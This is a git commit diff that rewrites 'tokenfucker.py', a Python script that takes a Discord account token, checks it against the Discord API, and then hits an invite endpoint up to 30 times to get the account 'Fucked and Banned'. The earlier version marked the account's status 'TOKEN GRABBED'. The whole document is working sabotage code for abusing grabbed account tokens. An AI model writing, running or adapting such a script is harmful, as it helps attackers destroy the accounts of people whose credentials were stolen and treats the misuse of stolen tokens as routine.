3c22cbdb1be97fbed3a405d359e47b2a130069ac
Tayzzz <42284450+Tayzzz@users.noreply.github.com>
2021-07-23 20:32:42 +0200

    Update tokenfucker.py

--- tokenfucker.py
+++ tokenfucker.py
@@ -1,30 +1,37 @@
 try:
-    import discord
     import requests
+    import os
 except ModuleNotFoundError as e:
     modulename = str(e).split("No module named ")[1].replace("'", "")
     input(f"Please install module with: pip install {modulename}")
     exit()
 
-import sys
 
-token = input("TOKEN TO FUCK: ")
-client = discord.Client()
+def main():
+    os.system("cls")
+    token = input("TOKEN TO FUCK: ")
+
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    }
+
+    body = requests.get(
+        'https://discordapp.com/api/v9/users/@me', headers=headers)
+
+    if body.status_code == 200:
+        print("Fucking the token, Please wait.")
+        for x in range(30):
+            r = requests.post(
+                "https://discordapp.com/api/v6/invite/r3sSKJJ", headers=headers)
+            if r.status_code != 200:
+                break
+        print("Token was Fucked and Banned !")
+    else:
+        print("Invalid token")
+
+    os.system("pause")
+    main()
 
 
-@client.event
-async def on_ready():
-    print("Fucking the token, Please wait.")
-    await client.change_presence(activity=discord.Game(name='TOKEN GRABBED'), status=discord.Status.do_not_disturb, afk=True)
-    for x in range(30):
-        requests.post(
-            "https://discordapp.com/api/v6/invite/r3sSKJJ", headers={
-                'Authorization': token
-            })
-    input("Token was Fucked !")
-    sys.exit()
-
-try:
-    client.run(token, bot=False)
-except Exception:
-    print("Token isn't vaild")
+main()
